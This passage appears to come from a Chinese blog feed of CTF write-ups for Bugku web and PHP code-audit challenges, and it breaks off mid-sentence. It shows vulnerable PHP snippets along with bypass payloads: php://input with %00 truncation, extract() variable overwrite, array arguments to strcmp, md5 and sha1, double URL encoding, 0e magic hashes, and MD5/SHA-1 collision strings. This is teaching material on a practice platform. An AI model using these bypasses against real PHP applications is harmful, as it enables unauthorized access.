id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>拿到题目是这样的</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915160754.png"></p><p>好像没什么思路，抓包看看吧</p><p>访问<code>/test/hello.php</code>会跳转到<code>/test/hello.php?id=1</code>，查看源代码发现有个<code>1p.html</code>，访问一下</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915161240.png"></p><p>发现，不抓包的话会跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">var Words &#x3D;&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; </span><br><span class="line">function OutWord()</span><br><span class="line">&#123;</span><br><span class="line">var NewWords;</span><br><span class="line">NewWords &#x3D; unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line">&#x2F;&#x2F; --&gt;</span><br></pre></td></tr></table></figure><p>Words中间好像有url编码，hackbar解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt;</span><br></pre></td></tr></table></figure><p>又看到其中很像base64，解码得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>好像还是url编码，再解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;no no no no no no no&#39;;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">    require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到有个f4l2a3g.txt，直接访问可以得到flag</p><pre><code>flag&#123;tHis_iS_THe_fLaG&#125;</code></pre><p>除此之外，也可以绕过</p><pre><code>payload:/test/hello.php?id=0easad&amp;b=%00adssadsa&amp;a=php://inputpost过去：bugku is a nice plateform!php会默认认为0e开头的弱等于0</code></pre><p><code>eregi()</code>函数用指定的模式搜索一个字符串中指定的字符串</p><pre><code>int eregi(string pattern, string string, [array regs]);</code></pre><p>存在%00截断漏洞，即%00后面的内容不解析</p><p><code>substr()</code>函数用于返回字符串的一部分</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> bugku </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku代码审计writeup</title>
      <link href="2019/09/29/bugku-codecheck-wp/"/>
      <url>2019/09/29/bugku-codecheck-wp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了bugku上web代码审计部分的writeup!</p><a id="more"></a><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>题目给出的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET); </span><br><span class="line">if(isset($shiyan)) </span><br><span class="line">&#123; </span><br><span class="line"> $content&#x3D;trim(file_get_contents($flag)); </span><br><span class="line"> if($shiyan&#x3D;&#x3D;$content)</span><br><span class="line">  &#123; </span><br><span class="line">   echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">  &#125; </span><br><span class="line"> else </span><br><span class="line">  &#123;</span><br><span class="line">   echo&#39;Oh.no&#39;;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>函数解释：</strong></p><p><strong>extract()函数</strong></p><p>用途：从数组中将变量导入到当前的符号表，返回值(int型)是成功导入到符号表中的变量数目</p><p>什么是符号表？</p><p>符号表是指当前php页面中，所有变量名称的集合</p><p><strong>isset()函数</strong></p><p>用途：检测变量是否设置，并且不是 NULL</p><p>注意：$_GET传过来的参数的键值为string类型</p><p><strong>file_get_contents()函数</strong></p><p>用途：file_get_contents() 函数把整个文件读入一个字符串中<br>如果失败，file_get_contents() 将返回 FALSE</p><p><strong>trim()函数</strong></p><p>用途：移除字符串两侧的空白字符或其他预定义字符</p><p><strong>解题思路：</strong></p><p>首先要GET传一个参数shiyan</p><p>然后读取了$flag所代表文件的内容</p><pre><code>payload: ?shiyan=&amp;flag=1</code></pre><p>此时$shiyan=’’(空字符串),而不是NULL,flag只需传除存在的文件名以外任意值,空字符串弱等于FALSE,输出flag</p><pre><code>flag&#123;bugku-dmsj-p2sm3N&#125;</code></pre><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">    if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) </span><br><span class="line">    &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0，如果两者相等，返回 0。</span><br><span class="line">    &#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class="line">    die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">    print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析代码可知需要传递个参数a</p><p>比较a和$flag的值，相同就会输出flag并结束</p><p>这里可以传入数组，strcmp()函数当比较数组和字符串的时候，返回是NULL即可绕过</p><pre><code>payload：?a[]=1flag&#123;bugku_dmsj_912k&#125;</code></pre><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">    echo(&quot;</span><br><span class="line"></span><br><span class="line">    not allowed!</span><br><span class="line"></span><br><span class="line">    &quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;</span><br><span class="line">    Access granted!</span><br><span class="line"></span><br><span class="line">    &quot;;</span><br><span class="line">    echo &quot;</span><br><span class="line">    flag</span><br><span class="line"></span><br><span class="line">    &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>函数解释：</strong></p><p><strong>eregi()函数</strong></p><pre><code>int eregi(string pattern, string string, [array regs]);</code></pre><p>eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写,如果没有找到匹配或出错则返回 FALSE</p><p>处理数组将返回NULL</p><p><strong>urldecode()函数</strong></p><p>解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符</p><p>分析代码可知不能让eregi()函数成功匹配，要让<code>$_GET[id] == &quot;hackerDJ&quot;</code>成立</p><p>php在处理传递过来的参数是会进行一次url解码</p><p>可以二次编码进行绕过</p><pre><code>payload:?id=hackerD%254A</code></pre><p>%25是%的url编码，%4A是J的url编码</p><p>这样经过php解析会得到</p><pre><code>?id=hackerD%4A</code></pre><p>再次经过函数解析会得到</p><pre><code>?id=hackerDJ</code></pre><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class="line"> &#123; </span><br><span class="line">    if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) </span><br><span class="line">        print &#39;Your password can not be your username.&#39;;</span><br><span class="line">     else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) </span><br><span class="line">        die(&#39;Flag: &#39;.$flag); </span><br><span class="line">    else </span><br><span class="line">        print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>函数解释：</strong></p><p><strong>md5()函数</strong></p><p>用途：以 32 字符十六进制数字形式返回散列值</p><p>**绕过方法:**md5()函数不能处理数组</p><pre><code>payload:?password[]=1&amp;username[]=2</code></pre><p>md5()函数在处理数组时会返回NULL</p><p><strong>md5碰撞</strong></p><p>两个MD5值相同的不同字符串</p><pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2和Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`flag&#123;bugk1u-ad8-3dsa-2&#125;`</code></pre><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>函数解释：</strong></p><p><strong>strpos()函数</strong></p><p>用于查找字符串首次出现的位置</p><pre><code>int strpos( string $haystack, mixed $needle[, int $offset = 0] )</code></pre><p>如果没找到 needle，将返回 FALSE</p><p>当$haystack为数组时，函数返回NULL,当$needle为数组时函数返回FALSE</p><pre><code>payload:?password[]=1</code></pre><p><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>和<code>strpos ($_GET[&#39;password&#39;], &#39;--&#39;)</code>的返回结果都是NULL,不强等于FALSE</p><pre><code>flag&#123;ctf-bugku-ad-2131212&#125;</code></pre><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>分析题目可知GET传参password，且不能为纯数字</p><pre><code>payload1:?password=2000a</code></pre><p>字符串进行数学运算时，会自动转换为数字后再进行运算</p><pre><code>payload2:?password[]=1</code></pre><p>is_numeric()函数处理数组时会返回FALSE</p><p>数组大于任一数字</p><pre><code>flag&#123;bugku_null_numeric&#125;</code></pre><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&#39;name&#39;]);</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">var_dump($_GET[&#39;password&#39;]);</span><br><span class="line">var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class="line">var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class="line">if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">echo &#39;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &#39;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传两个参数，name和password</p><p>并且这两个参数要经过sha1()加密还要相等才能输出flag</p><p>这里便想到了传入数组将返回NULL</p><pre><code>payload1:?name[]=1&amp;password[]=2</code></pre><p>sha1()碰撞</p><pre><code>payload2:?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>好像直接显示不出来，需要查看源代码或者抓包</p><pre><code>flag&#123;bugku--daimasj-a2&#125;</code></pre><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到<code>QNKCDZO</code>立马想到了md5弱比较</p><p>即php会把每一个以”0E”开头的哈希值都解释为0</p><pre><code>payload:?a=s878926199a</code></pre><p>其中<code>QNKCDZO</code>和<code>s878926199a</code> md5加密后都是0e开头</p><pre><code>flag&#123;bugku-dmsj-am9ls&#125;</code></pre><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">$number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">&#x2F;&#x2F; Check all the input characters!</span><br><span class="line">for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number &#x3D;&#x3D; $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出flag的条件$temp要弱等于<code>$number = 